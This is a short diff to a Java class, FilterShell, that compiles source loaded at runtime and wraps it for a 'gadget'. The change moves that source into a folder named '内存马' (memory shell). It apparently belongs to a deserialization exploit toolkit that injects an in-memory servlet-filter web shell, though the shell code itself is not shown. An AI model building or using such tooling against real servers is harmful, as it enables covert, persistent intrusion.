@@ -17,7 +17,7 @@ public class FilterShell {
     }
 
     public Object getObject(Class gadget) throws Exception {
-        InputStream inputStream = FilterShell.class.getClassLoader().getResourceAsStream("FilterShell.java");
+        InputStream inputStream = FilterShell.class.getClassLoader().getResourceAsStream("内存马/FilterShell.java");
         byte[] bytes = IOUtils.toByteArray(inputStream);
         String java = new String(bytes);
         byte[] b = JavaCompiler.compile("FilterShell",java);
